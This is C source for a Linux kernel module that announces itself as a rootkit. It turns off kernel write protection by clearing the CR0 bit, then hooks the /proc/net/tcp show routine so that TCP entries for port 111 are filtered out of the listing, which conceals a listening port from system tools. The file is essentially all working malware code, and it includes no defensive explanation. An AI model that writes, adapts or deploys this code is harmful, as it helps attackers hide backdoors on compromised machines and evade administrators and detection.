#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");

#define NET_ENTRY "/proc/net/tcp"
#define SECRET_PORT 111
#define NEEDLE_LEN 6
#define TMPSZ 150 // real tcp4_seq_show need this parameter, we can simply follow this.

unsigned long * seq_show_addr;

int (*real_seq_show)(struct seq_file *seq, void *v);

int fake_seq_show(struct seq_file *seq, void *v);

static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
    // prevent read from being reordered with respect to writes, use a dummy operand.
}

// the 16th bit of cr0 should be flipped if we want to change the memory info. 
static void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "protected memory\n");
}

static void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}

void hook_show(void) {
    struct file *filp;
    struct seq_file *test;
    filp = filp_open(NET_ENTRY, O_RDONLY, 0);

    test = (struct seq_file*) filp->private_data;
    real_seq_show = test->op->show;

    seq_show_addr = (unsigned long*)&test->op->show;
    unprotect_memory();
    *seq_show_addr = (unsigned long)fake_seq_show;
    protect_memory();
}


void hook_cleanup(void) {
    
    unprotect_memory();
    *seq_show_addr = (unsigned long)real_seq_show;
    protect_memory();
}

int fake_seq_show(struct seq_file *seq, void *v) {
    int ret;
    char needle[NEEDLE_LEN];

    snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
    ret = real_seq_show(seq, v);

    if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
        printk(KERN_INFO "Hiding port %d using needle %s.\n", SECRET_PORT, needle);
        seq->count -= TMPSZ; // next entry will overwritten this.
    }

    return ret;
}

static int __init mode_init(void) {
    printk(KERN_INFO "rootkit:init\n");
    hook_show();
    return 0;
}

static void __exit mode_exit(void) {
    hook_cleanup();
    printk(KERN_INFO "rootkit:exit\n");
}

module_init(mode_init);
module_exit(mode_exit);